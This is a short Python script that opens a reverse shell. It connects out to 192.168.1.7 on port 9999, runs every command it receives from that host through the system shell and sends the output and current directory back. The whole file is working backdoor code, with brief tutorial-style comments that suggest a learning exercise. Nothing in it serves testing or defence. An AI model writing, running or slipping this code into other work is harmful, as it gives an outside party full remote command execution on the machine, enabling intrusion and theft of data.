# 192.168.1.7.

import os
import socket
import subprocess


s= socket.socket()
host = '192.168.1.7'
port = 9999
s.connect((host,port))


while True:
    data = s.recv(1024) # data it gets from server into buffer of size 1024 bytes
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8")) # sends cd command to os.
    if len(data) >0: # takes any output and pipes it out to output stream
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # opens a process. data is in bytes from the transmission
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes)
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)

# close connection
s.close()
